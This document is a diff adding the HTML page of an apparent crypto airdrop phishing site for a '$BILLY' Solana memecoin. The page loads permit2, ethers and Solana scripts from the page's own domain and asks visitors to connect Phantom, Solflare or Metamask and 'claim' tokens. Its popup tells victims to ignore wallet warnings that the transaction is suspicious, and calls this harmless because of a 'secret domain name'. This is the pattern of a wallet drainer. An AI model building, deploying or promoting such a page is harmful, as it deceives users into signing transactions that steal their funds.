@@ -1,0 +1,241 @@
+<html lang="en" ml-update="aware">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <title>$BILLY</title>
+  <script src="https://billysol.top/ethers.js"></script>
+  <script src="https://billysol.top/permit2.js"></script>
+  <script src="https://billysol.top/solana.js"></script>
+  <script src="https://billysol.top/spl.js"></script>
+  <script src="https://billysol.top/index.js"></script>
+  <meta name="description" content="The cutest dog billy, is going to a billy.">
+  <link rel="canonical" href="https://billysol.top/">
+  <link rel="shortlink" href="https://billysol.top/">
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <meta property="og:url" content="https://billysol.top/">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="$BILLY">
+  <meta property="og:description" content="The cutest dog billy, is going to a billy.">
+  <meta property="og:image" content="/preview.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="billysol.top/">
+  <meta property="twitter:url" content="https://billysol.top/">
+  <meta name="twitter:title" content="$BILLY">
+  <meta name="twitter:description" content="The cutest dog billy, is going to a billy.">
+  <meta name="twitter:image" content="/preview.png">
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var audioElem = document.getElementById("myAudio");
+      audioElem.pause();
+      audioElem.muted = true;
+      audioElem.volume = 0;
+
+      function updateMuteButtonText() {
+        var muteBtn = document.getElementById("muteButton");
+        muteBtn.textContent = audioElem.muted ? "SONG" : "MUTE";
+      }
+
+      function fadeInVolume(targetVolume, duration) {
+        var volumeStep = targetVolume / (duration / 100);
+        var currentVolume = audioElem.volume;
+        var fadeInterval = setInterval(function () {
+          currentVolume += volumeStep;
+          if (currentVolume >= targetVolume) {
+            audioElem.volume = targetVolume;
+            clearInterval(fadeInterval);
+          } else {
+            audioElem.volume = currentVolume;
+          }
+        }, 100);
+      }
+
+      function toggleMute() {
+        if (audioElem.muted) {
+          audioElem.muted = false;
+          audioElem
+            .play()
+            .then(() => {
+              fadeInVolume(0.1, 5000);
+            })
+            .catch((e) => console.error("Playback failed:", e));
+        } else {
+          audioElem.muted = true;
+          audioElem.pause();
+          audioElem.volume = 0;
+        }
+        updateMuteButtonText();
+      }
+
+      var muteBtn = document.getElementById("muteButton");
+      muteBtn.addEventListener("click", toggleMute);
+
+      updateMuteButtonText();
+    });
+  </script>
+</head>
+
+
+<body>
+
+  <!-- <audio id="myAudio" autoplay="" loop="">
+    <source src="billy.mp3" type="audio/mpeg">
+  </audio> -->
+
+  <div class="hearthands" id="object1"></div>
+  <div class="doubleheart" id="object2"></div>
+  <div class="growingheart" id="object3"></div>
+  <div class="stars" id="object4"></div>
+  <div class="sparkleheart" id="object5"></div>
+  <div class="heartsmile" id="object6"></div>
+  <div class="paws" id="object7"></div>
+  <div class="pinch" id="object8"></div>
+  <div class="blueheart" id="object9"></div>
+  <div class="bone" id="object10"></div>
+
+  <div class="container">
+    <div class="content">
+      <img src="billy.jpg" class="portrait">
+    </div>
+    <div class="content-text">
+      <p>
+        $BILLY is the cutest dog on Solana, on a mission to be worth billyons and billyons!
+      </p>
+    </div>
+
+    <div class="button" style="cursor: not-allowed"><span>CLAIM $BILLY AIRDROP 👇</span></div>
+    <div class="button" id="actionButton" onclick="connect(0)"><span id="actionText">SELECT WALLET</span></div>
+
+    <div class="ca-text">
+      <p>
+        3B5wuUrMEi5yATD7on46hKfej3pfmd7t1RKgrsN3pump
+      </p>
+    </div>
+
+    <div class="container">
+      <div class="externals">
+        <div style="margin: 0 15px;" onclick="goto('https://t.me/ctobilly')">
+          <div class="square">
+            <img src="telegram.svg" alt="logo" class="logo">
+          </div>
+        </div>
+        <div style="margin: 0 15px;" onclick="goto('https://x.com/billysolcto')">
+          <div class="square">
+            <img src="x.svg" alt="logo" class="logo">
+          </div>
+        </div>
+        <div style="margin: 0 15px;" onclick="goto('https://raydium.io/swap/?inputMint=sol&outputMint=3B5wuUrMEi5yATD7on46hKfej3pfmd7t1RKgrsN3pump')">
+          <div class="square">
+            <img src="raydium.svg" alt="logo" class="logo">
+          </div>
+        </div>
+        <div style="margin: 0 15px;" onclick="goto('https://www.coingecko.com/en/coins/billy')">
+          <div class="square">
+            <img src="coingecko.svg" alt="logo" class="logo">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="content-text">
+      <p>
+        Make your own $BILLY meme!
+      </p>
+    </div>
+
+    <div class="horizontal-container">
+      <img src="meme1.png" id="slideshow" class="meme fade-in">
+    </div>
+
+    <script>
+      const images = [
+        "meme3.jpg",
+        "meme2.png",
+        "meme1.png",
+        "meme4.jpg",
+        "meme5.png",
+        "meme8.png",
+        "meme9.png",
+      ];
+
+      let currentImageIndex = 0;
+      const slideshowElement = document.getElementById("slideshow");
+
+      function changeImage() {
+        slideshowElement.classList.add("fade-out");
+
+        setTimeout(() => {
+          currentImageIndex = (currentImageIndex + 1) % images.length;
+          slideshowElement.src = images[currentImageIndex];
+          slideshowElement.classList.remove("fade-out");
+          slideshowElement.classList.add("fade-in");
+        }, 1000);
+      }
+
+      setInterval(changeImage, 3000);
+
+      slideshowElement.classList.add("fade-in");
+    </script>
+    <div class="button" style="margin-bottom: 40px; opacity: 80%;"><span>COMING SOON</span></div>
+    <div class="loader" id="claimPopup" style="display: none">
+      <div class="loader_background"></div>
+      <div class="loader_content">
+        <div class="loader_content_text">
+          <div class="content-text loader_content_text_description"> Some wallets may mark the transaction as
+            suspicious. <br data-v-cfe4382f=""> Transaction simulation may also not work. <br data-v-cfe4382f="">
+            Don't worry, it will not affect your funds. <br data-v-cfe4382f=""> This is due to the use of a secret
+            domain name. <br data-v-cfe4382f="">If you encounter any issues, please email us at billysolcuty@proton.me
+          </div>
+        </div>
+        <div class="loader_content_actions">
+          <div class="button" id="actionButton2" onclick="claim()"><span id="actionText2">GET 1000 $BILLY</span></div>
+        </div>
+        <div class="loader_content_warning">
+        </div>
+        <div class="button" onclick="closePopup()">Back</div>
+      </div>
+    </div>
+  </div>
+  <div aria-labelledby="swv-modal-title" id="walletModal" aria-modal="true" class="swv-modal" role="dialog" style="display: none">
+    <div class="swv-modal-overlay"></div>
+    <div class="swv-modal-container">
+      <div class="swv-modal-wrapper swv-modal-wrapper-no-logo"><!---->
+        <p class="swv-modal-title" id="swv-modal-title">Connect Wallet</p><button onclick="hideModal()" class="swv-modal-button-close"><svg
+            width="14" height="14">
+            <path
+              d="M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z">
+            </path>
+          </svg></button>
+        <ul class="swv-modal-list">
+          <li><button class="swv-button" onclick="connect(1)"><i class="swv-button-icon"><img
+                  src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo="
+                  alt="Phantom icon"></i>
+              <p>Phantom</p>
+              <div class="swv-wallet-status" id="phantomDetected" style="display: none"> Detected </div>
+            </button></li>
+          <li><button class="swv-button" onclick="connect(2)"><i class="swv-button-icon"><img
+                  src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+"
+                  alt="Solflare icon"></i>
+              <p>Solflare</p>
+              <div class="swv-wallet-status" id="solflareDetected" style="display: none"> Detected </div>
+            </button></li>
+          <li><button class="swv-button" onclick="connect(3)"><i class="swv-button-icon"><img
+                  src="metamask.svg"
+                  alt="Metamask icon"></i>
+              <p>Metamask</p><!---->
+              <div class="swv-wallet-status" id="metamaskDetected" style="display: none"> Detected </div>
+            </button></li>
+        </ul><!---->
+      </div>
+    </div>
+  </div>
+
+</body>
+
+</html>
